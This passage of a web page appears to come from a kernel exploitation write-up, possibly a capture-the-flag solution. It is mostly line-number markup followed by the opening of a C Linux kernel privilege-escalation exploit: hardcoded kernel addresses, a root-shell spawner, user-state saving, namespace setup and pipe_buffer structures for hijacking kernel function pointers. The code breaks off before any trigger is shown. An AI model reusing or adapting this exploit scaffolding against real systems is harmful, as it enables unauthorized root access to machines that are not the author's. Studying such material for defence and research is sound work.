class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * I - fundamental functions</span></span><br><span class="line"><span class="comment"> * e.g. CPU-core binder, user-status saver, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userspace status saver */</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">     * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">     * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">     * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">     * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">     * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span 